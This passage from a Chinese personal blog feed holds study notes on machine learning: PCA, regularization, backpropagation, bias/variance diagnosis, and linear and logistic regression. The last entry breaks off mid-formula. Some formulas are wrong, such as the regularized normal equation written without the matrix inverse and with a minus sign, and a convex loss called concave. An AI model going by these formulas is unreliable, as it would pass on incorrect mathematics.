PCA算法"></a>2.2 PCA算法</h3><p>参考：<a href="https://zhuanlan.zhihu.com/p/7751308">【机器学习】降维——PCA（非常详细） - 知乎 (zhihu.com)</a></p><p>参考：<a href="https://www.zhihu.com/question/330814299/answer/2540307765">怎么通俗地解释svd奇异值分解以及作用？ - 石溪的回答 - 知乎</a></p><p>已知原有的数据$X$为$n \times m$维的矩阵，其协方差矩阵$C = \frac{1}{m} XX^T$<br>求压缩后的矩阵$Y=PX$，且$Y$的协方差矩阵$D$是对角矩阵(协方差为零)，且对角线的元素尽可能大(方差最大化)</p><p>则有$ D = \frac{1}{m} (PX)(PX)^T$</p><p>$ D = \frac{1}{m} PX X^T P^T $</p><p>$ D = P \frac{1}{m}  X X^T P^T = PCP^T$</p><p>又协方差矩阵$C$是对称矩阵，设$E$为$C$的特征向量组成的矩阵，$\Lambda$为以特征值为对角线的矩阵，则有</p><p>$CE = E\Lambda$</p><p>由于对称矩阵的不同特征值对应的特征向量互相正交，则有$E^T = E^{-1}$，得</p><p>$E^T CE = \Lambda $</p><p>我们发现矩阵$\Lambda$正是我们需要的$D$，而取$E^T$的前$k$列正是我们需要的变换$P$</p><p>另一种方法是对$X$求奇异值分解:$[U, S, V] = svd(X)$，其中，<br>$U$表示变换后新坐标系的标准正交向量，其前$k$列的转置正是我们需要的变换$P$，<br>奇异值矩阵$S$相当于上述矩阵$\Lambda$的开方，<br>$V$表示变换前坐标系的标准正交向量的转置</p><h2 id="3-主成分数量选择"><a href="#3-主成分数量选择" class="headerlink" title="3. 主成分数量选择"></a>3. 主成分数量选择</h2><p>主成分数量越少，丢失的信息量越多。保留的信息量可用2.2中奇异值分解得到的矩阵$S$表示：</p><script type="math/tex; mode=display">\frac{\sum_{j=1}^k S_{j, j}} {\sum_{i=1}^n S_{i, i}}</script><p>可人为要求该值大于一定比例，如0.99，0.95等，确保数据压缩能保留足够多的信息</p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> PCA </tag>
            
            <tag> SVM </tag>
            
            <tag> K-Means </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一文讲清楚机器学习中的正则化、神经网络、机器学习诊断法</title>
      <link href="/2024/01/14/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85%E6%A5%9A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%88%99%E5%8C%96%E3%80%81%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%8A%E6%96%AD%E6%B3%95/"/>
      <url>/2024/01/14/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85%E6%A5%9A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%88%99%E5%8C%96%E3%80%81%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%8A%E6%96%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习吴恩达机器学习视频的第二篇笔记，内容包括：</p><ol><li>第七章————正则化</li><li>第八、九章————神经网络</li><li>第十章————机器学习诊断法</li></ol><p>个人博客页：<a href="https://andreww1219.github.io/2024/01/14/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85%E6%A5%9A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%88%99%E5%8C%96%E3%80%81%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%8A%E6%96%AD%E6%B3%95/">一文讲清楚机器学习中的正则化、神经网络、机器学习诊断法 | Andrew的个人博客 (andreww1219.github.io)</a></p><h1 id="一、正则化"><a href="#一、正则化" class="headerlink" title="一、正则化"></a>一、正则化</h1><h2 id="1-应用背景"><a href="#1-应用背景" class="headerlink" title="1. 应用背景"></a>1. 应用背景</h2><p>在前面对线性回归、逻辑回归的学习中，我们都是构造一个假设$h_\theta(x)$，然后得到他的损失函数$J(\theta)$，对其进行梯度下降操作使损失函数的值尽可能小。总而言之，就是对我们的训练集作出最好的拟合。</p><p>然而，当我们增加特征的维度，完美地去拟合我们的训练集时，会得到一条相当扭曲，不具有泛化性地曲线，这就是过拟合的问题。解决过拟合问题主要有以下两个手段：</p><ol><li>减少特征的数量$n$</li><li>采用正则化（也就是我们今天要介绍的内容）</li></ol><h2 id="2-什么是正则化？"><a href="#2-什么是正则化？" class="headerlink" title="2. 什么是正则化？"></a>2. 什么是正则化？</h2><p>我们采集了许多特征，并且相信这些特征对假设的预测值是有用的，并不想去舍弃它，又担心过拟合的问题。所以我们尽可能减小每个特征或某个特征对整体预测值的影响，在损失函数中增加<strong>对高特征值的惩罚</strong>，这就是正则化的思想。</p><h2 id="3-线性回归中的正则化"><a href="#3-线性回归中的正则化" class="headerlink" title="3. 线性回归中的正则化"></a>3. 线性回归中的正则化</h2><h3 id="3-1-梯度下降中的正则化"><a href="#3-1-梯度下降中的正则化" class="headerlink" title="3.1 梯度下降中的正则化"></a>3.1 梯度下降中的正则化</h3><p>由2可知，我们要在损失函数$J(\theta)$增加对高特征值的惩罚，得到：</p><script type="math/tex; mode=display">J(\theta) = \frac{1}{2m} [ \sum_{i=1}^m (h_\theta(x^{(i)}) - y^{(i)})^2 + \lambda \sum_{j=1}^n \theta_j^2]</script><p>得到 <script type="math/tex">\frac{\partial J(\theta) }{\partial \theta_j}= \frac{1}{m} [ \sum_{i=1}^m (h_\theta(x^{(i)}) - y^{(i)}) x_j^{(i)} + \lambda \theta_j]</script></p><p>那么有：  </p><script type="math/tex; mode=display">\begin{cases}\theta_0 = \theta_0 - \frac{\alpha}{m} \sum_{i=1}^m (h_\theta(x^{(i)}) - y^{(i)}) \\\theta_j = \theta_j - \frac{\alpha}{m} [ \sum_{i=1}^m (h_\theta(x^{(i)}) - y^{(i)}) x_j^{(i)} + \lambda \theta_j] = \theta_j(1 - \frac{\alpha\lambda}{m}) - \frac{\alpha}{m} \sum_{i=1}^m (h_\theta(x^{(i)}) - y^{(i)}) x_j^{(i)}\end{cases}</script><h3 id="3-2-正规方程中的正则化"><a href="#3-2-正规方程中的正则化" class="headerlink" title="3.2 正规方程中的正则化"></a>3.2 正规方程中的正则化</h3><p>将损失函数表示为矩阵形式，可得：</p><p>$J(\theta) = \frac{1}{2m} [(X\theta - Y)^T(X\theta - Y) + \lambda \theta^T \theta]$</p><p>得到 <script type="math/tex">\frac{\partial J(\theta) }{\partial \theta}= \frac{1}{m} [X^TX\theta - X^TY + \lambda \theta]</script></p><p>令  <script type="math/tex">\frac{\partial J(\theta) }{\partial \theta} = 0</script>，得</p><script type="math/tex; mode=display">\theta = (X^TX - \lambda E)X^TY</script><p>由于约定俗成的规则，$\theta_0$不参与正则化（实际参与得到的结果也差别不大），所以将上述式子中$E_{i,j}$的位置修改为0，就是正规方程带正则化的表达式。</p><h2 id="4-逻辑回归中的正则化"><a href="#4-逻辑回归中的正则化" class="headerlink" title="4. 逻辑回归中的正则化"></a>4. 逻辑回归中的正则化</h2><p>同线性回归中的梯度下降，我们可以得到相同的结果即：</p><script type="math/tex; mode=display">\begin{cases}\theta_0 = \theta_0 - \frac{\alpha}{m} \sum_{i=1}^m (h_\theta(x^{(i)}) - y^{(i)})\\\theta_j = \theta_j - \frac{\alpha}{m} [ \sum_{i=1}^m (h_\theta(x^{(i)}) - y^{(i)}) x_j^{(i)} + \lambda \theta_j] = \theta_j(1 - \frac{\alpha\lambda}{m}) - \frac{\alpha}{m} \sum_{i=1}^m (h_\theta(x^{(i)}) - y^{(i)}) x_j^{(i)}\end{cases}</script><h1 id="二、神经网络"><a href="#二、神经网络" class="headerlink" title="二、神经网络"></a>二、神经网络</h1><h2 id="1-问题描述"><a href="#1-问题描述" class="headerlink" title="1. 问题描述"></a>1. 问题描述</h2><p>输入层(Input Layer)：已知m组数据$x^{(1)}, x^{(2)}, …, x^{(m)}$，每组数据表示n个特征,可写为一个n+1维的向量<br>即：<script type="math/tex">(x^{(i)})^T = (x^{(i)}_0, x^{(i)}_1, ..., x^{(i)}_n)</script>，其中，$x^{(i)}_0=1$。</p><p>隐层(Hidden Layer)：介于输入层和输出层之间，每个隐层的每个结点接收上一个隐层（或输入层）的信号，经过一定处理后得到新的信号并传递给下一个隐层（或输出层）</p><p>输出层(Output Layer)：接受最后一个隐层的信号，经过加权处理后输出$y^{(i)}$。在多元分类问题中，向量$y^{(i)}$的维度就是所需要区分的类别的数量。</p><h2 id="2-前向传播-Forward-Propagation"><a href="#2-前向传播-Forward-Propagation" class="headerlink" title="2. 前向传播(Forward Propagation)"></a>2. 前向传播(Forward Propagation)</h2><p>我们用$z_i^{(j)}$表示第$j$层的第$i$个结点接收到的前一层的值加权后的总和，$a_i^{(j)}$表示第$j$层的第$i$个结点的输出，矩阵$\Theta^{(j)}$表示从第$j$层到第$j+1$层的权值，行数为$j+1$层的节点数，列数为$j$层的节点数+1（存在常数固定层，可看作激活阈值），即</p><p>$z_i^{(j+1)} = \sum_{k=0}^{第j层的结点数} \Theta_{i, k}^{(j)} a_k^j$</p><p>$a_i^{(j+1)} = g(z_i^{(j+1)})$</p><p>写成矩阵形式，则有 $ a^{(j+1)} = g( \Theta^{(j)} a^{(j)} )$</p><p>于是我们可以写出神经网络的假设$h_\theta(x^{(i)}) = g( \Theta^{(L-1)} a^{(L-1)} ))$，其中$L$为神经网络的层数。</p><h2 id="3-反向传播-Back-Propagation"><a href="#3-反向传播-Back-Propagation" class="headerlink" title="3. 反向传播(Back Propagation)"></a>3. 反向传播(Back Propagation)</h2><h3 id="3-1-定义损失函数"><a href="#3-1-定义损失函数" class="headerlink" title="3.1 定义损失函数"></a>3.1 定义损失函数</h3><p>有了假设，我们想要优化现有的模型，就需要对原有参数进行梯度下降，需要定义损失函数$J(\Theta)$，并对每一个参数即$\Theta_{i, k}^{(j)}$求偏导数$ \frac{\partial J(\Theta)}{\partial \Theta_{i, k}^{(j)}} $</p><p>于是我们有预测值$h_\theta(x) = a^{(L)}$，真实值$y$，第$j$层的节点数为$s_j$，则有</p><p>每个样本的均方误差 $E = \frac{1}{2} \sum_{i=1}^{s_L} (a_i^{(L)} - y_i)^2$</p><p>损失函数$J(\Theta) = \frac{1}{m} \sum_{i=1}^m E^{(i)} $</p><p>损失函数对参数的偏导数$\frac{\partial J(\Theta)}{\partial \Theta^{(j)}} = \frac{1}{m} \sum_{i=1}^m \frac{\partial  E^{(i)}}{\partial \Theta^{(j)}} $</p><h3 id="3-2-引入链式求导法"><a href="#3-2-引入链式求导法" class="headerlink" title="3.2 引入链式求导法"></a>3.2 引入链式求导法</h3><p>我们想要直接求$E$对$\Theta_{i, k}^{(j)}$的偏导数不太容易，因为我们的预测值是前面一步一步传递过来的，离输出层越远，$E$和$\Theta_{i, k}^{(j)}$的关系就越复杂。但是其中项之间的关系简单，偏导数易求，所以我们可以通过链式求导法则，由中间项之间的偏导数累乘得到$E$对$\Theta_{i, k}^{(j)}$的偏导数。</p><p>对输出层的参数，则有$ \frac{\partial E}{\partial \Theta_{i, k}^{(L-1)}}  =<br>\frac{\partial E}{\partial a_i^{(L)}}<br>\frac{\partial a_i^{(L)}}{\partial z_i^{(L)}}<br>\frac{\partial z_i^{(L)}}{\partial \Theta_{i, k}^{(L-1)}}$</p><p>其中，$\frac{\partial E}{\partial a_i^{(L)}} = a_i^{(L)} - y_i,<br>\frac{\partial a_i^{(L)}}{\partial z_i^{(L)}} = g’(z_i^{(L)}) = a_i^{(L)}(1 - a_i^{(L)}),<br>\frac{\partial z_i^{(L)}}{\partial \Theta_{i, k}^{(L-1)}} =a_k^{(L-1)} $</p><p>得$ \frac{\partial E}{\partial \Theta_{i, k}^{(L-1)}}  =<br>(a_i^{(L)} - y_i) a_i^{(L)}(1 - a_i^{(L)}) a_k^{(L-1)}$</p><p>我们将$\frac{\partial E}{\partial z_i^{(L)}} =<br>\frac{\partial E}{\partial a_i^{(L)}}<br>\frac{\partial a_i^{(L)}}{\partial z_i^{(L)}}  =<br>(a_i^{(L)} - y_i) a_i^{(L)}(1 - a_i^{(L)})$ 记作输出层的误差(error)为$\delta_i^{(L)}$，即</p><p>$\delta^{(L)} = (a^{(L)} - y) .* g’(z^{(L)})$</p><p><strong>(存疑，视频中取的$\delta^{(L)} = a^{(L)} - y$)</strong></p><p>于是我们用$\delta^{(l)}$表示<strong>均方误差$E$对第$l$层$z$的偏导</strong></p><h3 id="3-3-矩阵形式"><a href="#3-3-矩阵形式" class="headerlink" title="3.3 矩阵形式"></a>3.3 矩阵形式</h3><p>矩阵/向量/标量之间求导参考：<a href="https://zhuanlan.zhihu.com/p/262751195?utm_id=0">机器学习中的数学理论1：三步搞定矩阵求导</a></p><p>我们希望得到$E$对结果层参数$\Theta^{(L-1)}$的偏导数，即标量对矩阵的求导，使用<strong>分母布局</strong>，得到与$\Theta^{(L-1)}$相同维度的矩阵，方便减法运算作梯度下降。</p><p>由链式求导法则，有</p><p>$ \frac{\partial E}{\partial \Theta^{(L-1)}}  =<br>\frac{\partial E}{\partial z^{(L)}}<br>\frac{\partial z^{(L)}}{\partial \Theta^{(L-1)}}$</p><p>由于$\frac{\partial E}{\partial z^{(L)}} = \delta^{(L)}$，</p><p>又$z^{(L)} = \Theta^{(L-1)} a^{(L-1)}$，则有$ \frac{\partial z^{(L)}}{\partial \Theta^{(L-1)}} =<br>\frac{\partial \Theta^{(L-1)} \alpha^{(L-1)}}{\partial \Theta^{(L-1)}} = (\alpha^{(L-1)})^T<br>$（使用分母布局）</p><p>综上所述，$ \frac{\partial E}{\partial \Theta^{(L-1)}}  = \delta^{(L)} (\alpha^{(L-1)})^T$</p><p>记均方误差$E$对$\Theta^{(j)}$的偏导为$\Delta^{(j)}$，则有$ \Delta^{(L-1)} = \delta^{(L)} (\alpha^{(L-1)})^T$</p><h3 id="3-4-推导递推公式"><a href="#3-4-推导递推公式" class="headerlink" title="3.4 推导递推公式"></a>3.4 推导递推公式</h3><p>已知$\delta^{(l-1)} =<br>\frac{\partial E}{\partial z^{(l-1)}}$，那么</p><p>$\delta^{(l-1)} =<br>\frac{\partial E}{\partial z^{(l)}}<br>\frac{\partial z^{(l)}}{\partial z^{(l-1)}} =<br>\delta^{(l)}<br>\frac{\partial z^{(l)}}{\partial a^{(l-1)}}<br>\frac{\partial a^{(l-1)}}{\partial z^{(l-1)}} =<br>(\Theta^{(l-1)})^T \delta^{(l)} .* g’(z^{(l-1)})<br>$</p><p>即$\delta^{(l-1)} =<br>(\Theta^{(l-1)})^T \delta^{(l)} .* g’(z^{(l-1)})<br>$ ，这就是误差反向传导的递推公式</p><p>又$\frac{\partial z^{(l-1)}}{\partial \Theta^{(l-1)}} =<br>(a^{(l-1)})^T<br>$<br>同理</p><p>$\Delta^{(l-1)} = \frac{\partial E}{\partial \Theta^{(l-1)}}  = \delta^{(l)} (a^{(l-1)})^T$</p><h3 id="3-5-小结"><a href="#3-5-小结" class="headerlink" title="3.5 小结"></a>3.5 小结</h3><p>记损失函数对$\Theta^{(l)}$的偏导数为$D^{(l)} = \frac{\partial J(\Theta)}{\partial \Theta^{(l)}}$，则有</p><p>$D_{i, j}^{(l)} = \frac{1}{m} \sum^m \Delta_{i, j}^{(l)} =<br>\frac{1}{m} \sum^m \delta_i^{(l)} a_j^{(l-1)}$</p><p>若引入正则化项，则有</p><p>$D_{i, j}^{(l)} = \frac{1}{m} \sum^m \Delta_{i, j}^{(l)} =<br>\frac{1}{m} \sum^m \delta_i^{(l)} a_j^{(l-1)} + \lambda \Theta_{i, j}^{(l)}$</p><h1 id="三、机器学习诊断法"><a href="#三、机器学习诊断法" class="headerlink" title="三、机器学习诊断法"></a>三、机器学习诊断法</h1><h2 id="1-问题描述-1"><a href="#1-问题描述-1" class="headerlink" title="1. 问题描述"></a>1. 问题描述</h2><p>我们需要评估我们训练出来的模型，判断是否过拟合，即高方差(variance)，还是欠拟合，即高偏差(bias)。通常情况下，我们有许多方式去改进模型，但是不知道应该选哪一种。我们将讨论各个参数与偏差、方差的关系，帮助我们确定模型是处于高方差还是高偏差，应该怎样采取调整策略。</p><h2 id="2-讨论变量"><a href="#2-讨论变量" class="headerlink" title="2.讨论变量"></a>2.讨论变量</h2><p>我们将遵循同一分布的数据集划分为训练集和验证集，训练集用来训练得到某一变量在不同值下的模型，由验证集对该变量进行选择。</p><p>记训练集误差为$J_{train}(\theta)$，验证集误差为$J_{cv}(\theta)$</p><p>我们选择测试集误差最小的模型作为结果</p><p>但是，要如何验证我们模型的泛化能力？即模型对不同但具有相似分布的数据集(测试集)的表现。</p><p>所以我们一开始将数据集划分为训练集、验证集和测试集，由验证集对变量进行选择，由测试集对模型的泛化能力进行评估，<strong>不能将测试集用于调整参数，否则会导致过拟合</strong></p><h3 id="2-1-特征数-d"><a href="#2-1-特征数-d" class="headerlink" title="2.1 特征数$d$"></a>2.1 特征数$d$</h3><p>我们记参数的多项式次数（相当于特征数）为d</p><p>当特征数过少时，训练集误差$J_{train}(\theta)$和验证集误差$J_{cv}(\theta)$都很大，模型欠拟合；<br>当特征数过多时，训练集误差$J_{train}(\theta)$很小，而验证集误差$J_{cv}(\theta)$较大，模型过拟合</p><h3 id="2-2-正则化参数-lambda"><a href="#2-2-正则化参数-lambda" class="headerlink" title="2.2 正则化参数$\lambda$"></a>2.2 正则化参数$\lambda$</h3><p>当$\lambda$很小时，训练集误差$J_{train}(\theta)$很小，而验证集误差$J_{cv}(\theta)$较大，模型过拟合;<br>当$\lambda$很大时，训练集误差$J_{train}(\theta)$和验证集误差$J_{cv}(\theta)$都很大，模型欠拟合</p><h3 id="2-3-数据集规模-m"><a href="#2-3-数据集规模-m" class="headerlink" title="2.3 数据集规模$m$"></a>2.3 数据集规模$m$</h3><p>我们将数据集规模$m$与误差关系的曲线叫做学习曲线</p><p>在高偏差即欠拟合的情况下，随着数据集规模$m$的增大，训练集误差将非常接近于验证集误差<br>在高方差即过拟合的情况下，随着数据集规模$m$的增大，验证集误差能有效减小，说明在过拟合情况下，增大数据规模是有效的</p><h2 id="3-小结"><a href="#3-小结" class="headerlink" title="3. 小结"></a>3. 小结</h2><p>当模型高方差时，我们可以选择：</p><ol><li>增大数据集规模</li><li>减小特征数$d$</li><li>增大正则化参数$\lambda$</li></ol><p>当模型高偏差时，我们可以选择：</p><ol><li>增加特征数$d$</li><li>减小正则化参数$\lambda$</li></ol>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> 线性回归 </tag>
            
            <tag> 逻辑回归 </tag>
            
            <tag> BP神经网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一文讲清楚线性回归(Linear Regression)、逻辑回归（Logistic Regression）</title>
      <link href="/2024/01/11/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85%E6%A5%9A%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92(Linear%20Regression)%E3%80%81%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%88Logistic%20Regression%EF%BC%89/"/>
      <url>/2024/01/11/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85%E6%A5%9A%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92(Linear%20Regression)%E3%80%81%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%88Logistic%20Regression%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>被各种ddl加上期末考试耽搁了一段时间，准备继续肝机器学习了，对前面学的东西做个阶段性总结。<br>刷的是吴恩达的课：<a href="https://www.bilibili.com/video/BV164411b7dxZ0">[中英字幕]吴恩达机器学习系列课程</a></p><h1 id="一、线性回归-Linear-Regression"><a href="#一、线性回归-Linear-Regression" class="headerlink" title="一、线性回归(Linear Regression)"></a>一、线性回归(Linear Regression)</h1><h2 id="1-问题描述"><a href="#1-问题描述" class="headerlink" title="1. 问题描述"></a>1. 问题描述</h2><p>已知m组数据$x^{(1)}, x^{(2)}, …, x^{(m)}$，每组数据表示n个特征,可写为一个n+1维的向量<br>即：<script type="math/tex">(x^{(i)})^T = (x^{(i)}_0, x^{(i)}_1, ..., x^{(i)}_n)</script>，其中，$x^{(i)}_0=1$<br>每组数据对应一个真实值$y^{(i)}$，所有$y$值在一块可表示为一个m维向量$y$<br>我们需要构造一个预测值：$\widehat{y}=\theta_0+\theta_1x_1+…+\theta_nx_n$<br>该函数叫做我们的hypothesis(假设)，记为$h_\theta(x)$，<br>那么有$h_\theta(x)=\theta^Tx$，其中$\theta^T$和$x$都为n+1维的向量，我们要求解的就是<strong>使预测值最准确的$\theta$值</strong></p><h2 id="2-梯度下降-Gradient-Descend"><a href="#2-梯度下降-Gradient-Descend" class="headerlink" title="2. 梯度下降(Gradient Descend)"></a>2. 梯度下降(Gradient Descend)</h2><p>那么要怎么表示我们的预测和真实值的误差呢？我们引入cost function(代价函数 或 <strong>损失函数</strong>)，记为$J(\theta)$，在线性回归中，我们通常使用平方误差作为损失函数，即：</p><script type="math/tex; mode=display">J(\theta) = \frac{1}{2m}\sum_{i=1}^m (h_\theta(x^{(i)})-y)^2</script><p>现在我们要做的，就是找到一个$\theta$值，使得损失函数的值最小，最直接的方法就是求导找极值点，故有：<br>$\frac{\partial J(\theta)}{\partial\theta} = \frac{1}{m}\sum_{i=1}^m (h_\theta(x^{(i)})-y)x^{(i)}$，前面取$x^{(i)}_0=1$是为了使这里的偏导都符合同一形式。</p><p>在这里，当$\frac{\partial J(\theta)}{\partial\theta}&gt;0$时，我们的损失函数会随着$\theta$的增大而增大，当$\frac{\partial J(\theta)}{\partial\theta}&lt;0$时，我们的们的损失函数会随着$\theta$的增大而减小。</p><p>故只要将$\theta$减去偏导数的一定倍数（我们称之为<strong>学习率$\alpha$</strong>），就可保证我们的$\theta$更优。之后重复这一过程，直到$\theta$收敛到一定区间，说明我们的$\theta$达到局部最优，这就是梯度下降法。</p><p><strong>需要注意的是</strong>：$\theta$会达到全局最优的条件是：我们的损失函数$J(\theta)$是<strong>凹函数</strong>，即$\frac{\partial^2 J(\theta)}{\partial\theta^2}&gt;0$。在使用平方误差作为我们的预测值时，能保证这一条件，故可使用梯度下降。</p><p>梯度下降中$\theta$的迭代公式为: $\theta_j = \theta_j - \alpha\frac{\partial J(\theta)}{\partial\theta}, j = 1, 2, …, n$<br>使用平方误差时: $\theta_j = \theta_j - \alpha\frac{1}{m}\sum_{i=1}^m (h_\theta(x^{(i)})-y)x_j^{(i)}$</p><h3 id="2-1-特征缩放-Feature-Scaling"><a href="#2-1-特征缩放-Feature-Scaling" class="headerlink" title="2.1 特征缩放(Feature Scaling)"></a>2.1 特征缩放(Feature Scaling)</h3><p>每组数据$x$包含m个维度，每个维度的数据范围不尽相同，例如$-200&lt;x_1&lt;400$，而$-3&lt;x_2&lt;3$，对他们的预测值求平方误差后，对$\theta_j$的影响幅度不同，这导致了$\theta$之间形成的等高线会相当陡峭，拟合的过程相对曲折。</p><p>所以，我们最好将每个维度的数据都放缩到接近$-1&lt;x_j&lt;1$的范围，下面有个示例：<br>已知：$-200&lt;x_1&lt;400$，取$x_1 = \frac{x_1 - 100}{600} (100 = \frac{-200+400}{2}, 600 = 400-(-200))$，得到新的$-0.5&lt;x_1&lt;0.5$</p><h3 id="2-2-学习率-Learning-Rate"><a href="#2-2-学习率-Learning-Rate" class="headerlink" title="2.2 学习率(Learning Rate)"></a>2.2 学习率(Learning Rate)</h3><p>选择学习率是一件需要技巧的事情，过低的学习率会使$\theta$收敛较慢，过高的学习率可能会使$\theta$无法准确收敛，甚至出现发散。</p><p>吴恩达的视频里只是讨论了学习率过高和学习率过低的影响，我就在想既然$\theta$是在计算中一步一步迭代的，那有没有方法也能对$\alpha$进行迭代。网上果然能搜到许多方案，后面再深入了解一下吧。<br><a href="https://zhuanlan.zhihu.com/p/390261440">可能是深度学习中最重要的超参数：学习率 - 知乎 (zhihu.com)</a></p><h2 id="3-正规方程-Normal-Equation"><a href="#3-正规方程-Normal-Equation" class="headerlink" title="3. 正规方程(Normal Equation)"></a>3. 正规方程(Normal Equation)</h2><p>将m组数据表示为$m*(n+1)$维的矩阵，记为$X$，每组数据对应的真实值表示为一个m维向量$y$<br>则我们所需要的最优的$\theta=(X^T X)^{-1}X^Ty$<br>视频中没有给出证明，根据<a href="https://zhuanlan.zhihu.com/p/60719445">详解正规方程（Normal Equation） - 知乎 (zhihu.com)</a>，先用矩阵形式表示损失函数即$Cost(\theta) = \frac{1}{2m} (X\theta - Y)^T(X\theta - Y)$,对其求偏导，经过很多多多步化简，得到$\Delta = \frac{\partial Cost(\theta)}{\partial \theta} = \frac{1}{m}(X^T X\theta - X^TY)$ 令$\Delta = 0$，得到正规方程$\theta=(X^T X)^{-1}X^Ty$</p><h2 id="4-梯度下降和正规方程的比较"><a href="#4-梯度下降和正规方程的比较" class="headerlink" title="4. 梯度下降和正规方程的比较"></a>4. 梯度下降和正规方程的比较</h2><h3 id="梯度下降"><a href="#梯度下降" class="headerlink" title="梯度下降"></a>梯度下降</h3><ol><li>需要选择学习率</li><li>需要多步迭代，且每一步迭代都需要对每个维度的偏导数进行计算</li><li>在$n$较大，即数据维度很大时表现很好</li></ol><h3 id="正规方程"><a href="#正规方程" class="headerlink" title="正规方程"></a>正规方程</h3><ol><li>不需要选择学习率，不需要迭代，一步算出答案</li><li>矩阵的逆的计算复杂度很高，在$n$较大，即数据维度很大时表现不好</li></ol><h1 id="二、逻辑回归-Logistic-Regression"><a href="#二、逻辑回归-Logistic-Regression" class="headerlink" title="二、逻辑回归(Logistic Regression)"></a>二、逻辑回归(Logistic Regression)</h1><h2 id="1-问题描述-1"><a href="#1-问题描述-1" class="headerlink" title="1. 问题描述"></a>1. 问题描述</h2><p>已知m组数据$x^{(1)}, x^{(2)}, …, x^{(m)}$，每组数据表示n个特征,可写为一个n+1维的向量<br>即：<script type="math/tex">(x^{(i)})^T = (x^{(i)}_0, x^{(i)}_1, ..., x^{(i)}_n)</script>，其中，$x^{(i)}_0=1$<br>且每组数据的真实值$y^{(i)}$只能为0或1<br>现在我们需要构造一个预测值$h_\theta(x)$，同时求解使预测值最准确的$\theta$值</p><h2 id="2-Sigmoid函数的引入"><a href="#2-Sigmoid函数的引入" class="headerlink" title="2. Sigmoid函数的引入"></a>2. Sigmoid函数的引入</h2><p>更加自然的引入请见：<a href="https://andreww1219.github.io/2024/01/20/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E6%A6%82%E7%8E%87%E7%94%9F%E6%88%90%E6%A8%A1%E5%9E%8B/">机器学习笔记——概率生成模型 | Andrew的个人博客 (andreww1219.github.io)</a></p><p>————————分割线——————————</p><p>以下是未了解概率生成模型时的解释</p><p>前面说到的线性回归，是对$x$的每一个维度$x_j$引入一个权值$\theta_j$，简单来说就是，通过$\theta$作用于$x$中每个维度的信息，得到预测值，而我们想要的预测值范围可以是实数域上任意的数，所以就直接用$\theta^Tx$作为预测值。</p><p>而现在，真实值是离散的，只能为0或1，使用$h_\theta(x)=\theta^Tx$可能会得到$\infty$这样的结果。我们需要的是一个关于$\theta^Tx$的函数，即$h_\theta(x)=g(\theta^Tx)$，且函数$g(z)$是能够表示离散值取值的函数</p><p>因此引入sigmoid函数$g(z)=\frac{1}{1+e^{-z}}$，这个函数有很好的性质如$0&lt;g(z)=\frac{1}{1+e^{-z}}&lt;1$，可以用它来表示某一事件的概率。我们将$z$替换为$h_\theta(x)=\theta^Tx$，可得$h_\theta(x)=\frac{1}{1+e^{-\theta^Tx}}$，表示在给定$\theta$的情况下，数据$x$使y值得到1的概率。</p><h2 id="3-用概率论引出损失函数"><a href="#3-用概率论引出损失函数" class="headerlink" title="3. 用概率论引出损失函数"></a>3. 用概率论引出损失函数</h2><p>参考文献：<a href="https://blog.csdn.net/github_39421713/article/details/89213747">伯努利分布的最大似然估计_伯努利分布的似然函数-CSDN博客</a></p><p>上文中我们定义了$h_\theta(x)$为y值等于1的概率，我们将其记为$p$<br>在伯努利分布中：$P(Y=0) = 1 - p， P(Y=1) = p$<br>由于Y只能取0和1，我们可以将其概率分布用一个式子表示：$P(Y=y) = p^y(1-p)^{(1-y)}$</p><p>我们记$f(y_i |p)=P(Y=y_i)$表示给定p下，我们取到真实值的概率，及预测的准确率<br>我们将取到所有真实值的概率累乘，得到关于p的似然函数$L(p) = \prod_{i=1}^m{f(y_i|p)}$<br>那么当似然函数$L(p)$即$L(h_\theta(x)$的取值越大时，我们的预测越准确，<br>反之，$-L(p)$即$-L(h_\theta(x))$的取值越大时，我们的预测越不准确，是的你没听错，这个函数反映了我们预测的误差，这正是我们要找的损失函数……的雏形。<br>先别着急，我们想要的损失函数应该方便求导之后做梯度下降，而似然函数是许多$p$的指数形式连乘，不方便求导，于是对两边取对数<br>则有$-\ln L(p) = -\sum_{i=1}^m y_i\ln p+(1-y_i)\ln (1-p)$<br>即$-\ln L(h_\theta(x)) = -\sum_{i=1}^m y_i\ln h_\theta(x^{(i)}) + (1-y_i)\ln 